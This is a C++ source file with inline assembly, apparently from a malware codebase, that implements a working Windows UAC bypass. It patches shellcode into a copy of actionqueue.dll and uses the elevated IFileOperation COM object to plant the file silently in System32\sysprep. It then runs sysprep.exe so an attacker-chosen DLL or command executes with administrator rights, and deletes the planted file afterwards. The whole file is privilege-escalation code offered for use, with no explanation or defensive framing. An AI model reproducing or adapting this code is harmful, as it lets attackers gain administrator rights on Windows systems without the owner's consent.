#include "core\core.h"
#include "core\reestr.h"
#include "core\file.h"
#include "core\pe.h"
#include "core\debug.h"
#include <Imagehlp.h>

namespace Elevation
{

#ifndef _WIN64

#define FAKE_DLL_NAME	L"actionqueue.dll"
#define FOFX_REQUIREELEVATION (0x10000000)

#pragma optimize("", off)

extern "C"
{

__declspec(naked) VOID dllloader_start()
{
	__asm
	{
		call delta
delta:
		pop	eax
		sub	eax,5
		add eax,0x22222222 //путь к dll
		push eax
		mov eax,0x11111111 //LoadLibraryA
		call eax
		xor eax,eax
		push eax
		mov eax,0x33333333 //ExitProcess
		call eax
	}
}

__declspec(naked) VOID winexec_start()
{
	__asm
	{
		call delta
delta:
		pop	eax
		sub	eax,5
		add eax,0x22222222 //путь к командной строке
		push 1
		push eax
		mov eax,0x11111111 //WinExec
		call eax
		xor eax,eax
		push eax
		mov eax,0x33333333 //ExitProcess
		call eax
	}
}


}

#pragma optimize("", on)

static void SetFunc( Mem::Data& data, uint mask, void* func )
{
	data.Replace( &mask, sizeof(mask), &func, sizeof(func) );
}

/*
static PVOID MapBinary( const char* path, DWORD fileAccess, DWORD fileFlags, DWORD pageAccess, DWORD mapAccess, PDWORD size)
{
	void* map = NULL;
	HANDLE file = File::Open( path, fileAccess, OPEN_EXISTING, fileFlags ); 
	if( file )
	{
		HANDLE mapping = API(KERNEL32, CreateFileMappingA)( file, NULL, pageAccess, 0, 0, 0 );
		if( mapping != INVALID_HANDLE_VALUE )
		{
			map = API(KERNEL32, MapViewOfFile)( mapping, mapAccess, 0, 0, 0 );
			if( map )
			{
				if( size ) *size = API(KERNEL32, GetFileSize)( file, NULL );
			}
			API(KERNEL32, CloseHandle)(mapping);
		}
		else
			File::Close(file);
	}
	return map;
};
*/

static DWORD RvaToOffset (PIMAGE_NT_HEADERS pe, DWORD rva )
{
	PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(pe);

	for( int i = 0; i < pe->FileHeader.NumberOfSections; i++ )
	{
		if( rva >= sec->VirtualAddress && rva < (sec->VirtualAddress + sec->Misc.VirtualSize))
		{
			return sec->PointerToRawData + rva - sec->VirtualAddress;
		}
		sec++;
	}
	return 0;
}


static bool WriteFileShellcode( const char* fileName, const char* dllName, const char* cmd )
{
	bool ret = false;
//	uint loaderSize = (uint)dllloader_end-(uint)dllloader_start;
	uint loaderSize = 48;
	HMODULE kernel32 = API(KERNEL32, GetModuleHandleA)( _CS_("kernel32.dll") );
	Mem::Data loader(512);

	if( dllName && dllName[0] )
	{
		loader.Copy( dllloader_start, loaderSize );
		SetFunc( loader, 0x11111111, (typeLoadLibraryA)API(KERNEL32, GetProcAddress)( kernel32, _CS_("LoadLibraryA") ) );
		loader.Append( dllName, Str::Len(dllName) + 1 );
	}
	else
	{
		loader.Copy( winexec_start, loaderSize );
		SetFunc( loader, 0x11111111, (typeLoadLibraryA)API(KERNEL32, GetProcAddress)( kernel32, _CS_("WinExec") ) );
		loader.Append( cmd, Str::Len(cmd) + 1 );
	}
	SetFunc( loader, 0x33333333, API(KERNEL32, ExitProcess) );
	SetFunc( loader, 0x22222222, (void*)loaderSize );

	Mem::Data data;
	//void* map = MapBinary( fileName, FILE_ALL_ACCESS, FILE_FLAG_WRITE_THROUGH, PAGE_READWRITE, FILE_MAP_ALL_ACCESS, &fileSize);
	if( File::ReadAll( fileName, data ) )
	{
		PIMAGE_NT_HEADERS ntHdr = PE::GetNTHeaders( (HMODULE)data.Ptr() );
		if( ntHdr )
		{
			int p = RvaToOffset( ntHdr, ntHdr->OptionalHeader.AddressOfEntryPoint);
			Mem::Copy( data.p_byte() + p, loader.Ptr(), loader.Len() );

			ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
			ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = NULL;
					
			DWORD headerSum, checkSum;
			if( API(IMAGEHLP, CheckSumMappedFile)( data.Ptr(), data.Len(), &headerSum, &checkSum ) )
			{
				ntHdr->OptionalHeader.CheckSum = checkSum;
				ret = true;
			}
		}
		File::Write( fileName, data );
	}
	return ret;
}

#endif

bool COM( const char* dllPath, const char* cmd )
{
#ifdef _WIN64
	return false;
#else
	bool res = false;
	HRESULT hr = API(OLE32, CoInitializeEx)( NULL, COINIT_APARTMENTTHREADED|COINIT_DISABLE_OLE1DDE );
	if( !SUCCEEDED(hr) ) return false;

	BIND_OPTS3 bo;
	Mem::Zero(bo);
	bo.cbStruct = sizeof(bo);
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;			

	IFileOperation *fileOp;
	for (int i = 0; i < 20; i++)
	{
		hr = API(OLE32, CoGetObject)( L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", &bo, __uuidof(IFileOperation), (PVOID*)&fileOp );
		if( hr != 0x800704c7) break;
	}
	if( SUCCEEDED(hr) )
	{
		hr = API(OLE32, CoCreateInstance)( __uuidof(FileOperation), NULL, CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER, __uuidof(IFileOperation), (PVOID*)&fileOp );
		if( SUCCEEDED(hr) )
		{
			hr = fileOp->SetOperationFlags( FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION );
			if( !SUCCEEDED(hr) ) hr = fileOp->SetOperationFlags( FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS );
			if( SUCCEEDED(hr) )
			{
				char tmpFile[MAX_PATH];
				StringBuilder fakeDll(MAX_PATH);
				File::GetTempFile(tmpFile);
				Path::GetCSIDLPath( CSIDL_SYSTEM, fakeDll, _CS_("actionqueue.dll") );
				if( File::Copy( fakeDll,  tmpFile ) && WriteFileShellcode( tmpFile, dllPath, cmd ) )
				{
					DbgMsg( "fake dll: '%s' inject dll '%s'", tmpFile, dllPath );
					wchar_t* tmpFileW = Str::ToWideChar(tmpFile);
					IShellItem *SHISource;
					hr = API(SHELL32, SHCreateItemFromParsingName)( tmpFileW, NULL, __uuidof(IShellItem2), (PVOID*)&SHISource );
					if( SUCCEEDED(hr) )
					{
						StringBuilder sysprepDir(MAX_PATH);
						Path::GetCSIDLPath( CSIDL_SYSTEM, sysprepDir, _CS_("sysprep") );
						wchar_t* sysprepDirW = Str::ToWideChar(sysprepDir);
						IShellItem *SHIDestination;
						hr = API(SHELL32, SHCreateItemFromParsingName)( sysprepDirW, NULL, __uuidof(IShellItem2), (PVOID*)&SHIDestination );
						if( SUCCEEDED(hr) )
						{
							hr = fileOp->CopyItem( SHISource, SHIDestination, FAKE_DLL_NAME, NULL );
							if( SUCCEEDED(hr) )
							{
								hr = fileOp->PerformOperations();
								if( SUCCEEDED(hr) )
								{
									BOOL aborted = TRUE;
									while( aborted )
									{
										hr = fileOp->GetAnyOperationsAborted(&aborted);
										if( !SUCCEEDED(hr) )
										{
											DbgMsg( "GetAnyOperationsAborted failed: %x", hr );	
											break;
										}
									}

									SHELLEXECUTEINFOA shinfo;
									Mem::Zero(shinfo);
									StringBuilder sysprep(MAX_PATH);
									Path::Combine( sysprep, sysprepDir, _CS_("sysprep.exe") );
									shinfo.cbSize = sizeof(shinfo);
									shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
									shinfo.lpFile = sysprep;
									shinfo.lpParameters = NULL;
									shinfo.lpDirectory = sysprepDir;
									shinfo.nShow = SW_SHOW;
										
									for(;;)
									{
										if( API(SHELL32, ShellExecuteExA)(&shinfo) ) break;
										int err = API(KERNEL32, GetLastError)();
										if( err != ERROR_CANCELLED) break;
										DbgMsg( "ShellExecuteEx failed: %d", err );
										Delay(1000);
									}
									if( API(KERNEL32, WaitForSingleObject)( shinfo.hProcess, 120 * 1000 ) == WAIT_TIMEOUT )
										API(KERNEL32, TerminateProcess)( shinfo.hProcess, 0 );
									API(KERNEL32, CloseHandle)( shinfo.hProcess );
									res = true;
									Path::Combine( fakeDll, sysprepDir, _CS_("actionqueue.dll") );
									IShellItem *SHIDelete;
									wchar_t* fakeDllW = Str::ToWideChar( fakeDll, fakeDll.Len() );
									hr = API(SHELL32, SHCreateItemFromParsingName)( fakeDllW, NULL, __uuidof(IShellItem2), (PVOID*)&SHIDelete );
									if( SUCCEEDED(hr) )
									{
										hr = fileOp->DeleteItem( SHIDelete, NULL );
										if( SUCCEEDED(hr) )
											fileOp->PerformOperations();
										else
										{
											DbgMsg( "DeleteItem failed: %x", hr );		
											SHIDelete->Release();
										}
									}
									else
									{
										DbgMsg( "SHCreateItemFromParsingName failed: %x", hr );		
									}
								}
								else
								{
									DbgMsg( "PerformOperations failed: %x", hr );		
								}
							}
							else
							{
								DbgMsg( "CopyItem failed: %x", hr );	
							}
							SHIDestination->Release();
						}
						else
						{
							DbgMsg( "SHCreateItemFromParsingName failed: %x", hr );		
						}
						SHISource->Release();
						WStr::Free(sysprepDirW);
					}
					else
					{
						DbgMsg( "SHCreateItemFromParsingName failed: %x", hr );	
					}
					File::Delete(tmpFile);
					WStr::Free(tmpFileW);
				}
			}
			else
			{
				DbgMsg( "SetOperationFlags failed: %x", hr );
			}
			fileOp->Release();
		}
		else
		{
			DbgMsg( "CoCreateInstance failed: %x", hr );
		}
	}
	else
	{
		DbgMsg( "CoGetObject failed: %x", hr );
	}
	API(OLE32, CoUninitialize)();
	return res;
#endif
}

}
